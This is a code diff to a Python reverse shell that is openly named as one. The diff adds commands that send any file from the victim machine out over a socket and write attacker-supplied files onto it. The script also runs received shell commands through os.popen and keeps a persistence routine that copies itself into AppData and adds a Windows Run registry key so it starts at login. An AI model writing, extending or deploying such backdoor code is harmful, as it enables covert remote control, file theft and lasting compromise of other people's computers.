@@ -1,4 +1,5 @@
 #!/usr/bin/python
+import base64
 import socket
 import json
 import time
@@ -32,12 +33,19 @@ def shell():
                 os.chdir(cmd[3:])
             except:
                 continue
-        try:
-            proc = os.popen(cmd)  # open a process to run commands on shell
-            res = proc.read()  # command result
-            reliable_send(res)
-        except:
-            reliable_send("Unrecognized command")
+        elif cmd[:8] == "download":
+            download(cmd)
+            continue
+        elif cmd[:6] == "upload":
+            upload(cmd)
+            continue
+        else:
+            try:
+                proc = os.popen(cmd)  # open a process to run commands on shell
+                res = proc.read()  # command result
+                reliable_send(res)
+            except:
+                reliable_send("Unrecognized command")
 
 
 def reliable_send(data):
@@ -55,15 +63,35 @@ def reliable_recv():
             continue
 
 
+def download(cmd):
+    try:
+        with open(cmd[9:], "rb") as file:
+            reliable_send(base64.b64encode(file.read()))
+            return True
+    except:
+        return False
+
+
+def upload(cmd):
+    try:
+        with open(cmd[7:], "wb") as file:
+            result = reliable_recv()
+            file.write(base64.b64decode(result))
+            return True
+    except:
+        return False
+
+
 # write on Windows registry to autorun on startup
 def persistence():
-    location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\<user>\AppData\Roaming\ReverseShell.exe
+    location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\%username%\AppData\Roaming\ReverseShell.exe
     if not os.path.exists(location):
         # Copy this .exe file into the specified location
         shutil.copyfile(sys.executable, location)
         # Add register key to HKEY_CURRENT_USER autorun allowed services (Microsoft\Windows\...\Run)
         # name the entry (/v), define the common register Type (/t), define the Data part (/d)
-        os.popen('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ReverseShell /t REG_SZ /d "' + location + '"')
+        os.popen(
+            'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ReverseShell /t REG_SZ /d "' + location + '"')
 
 
 if __name__ == '__main__':
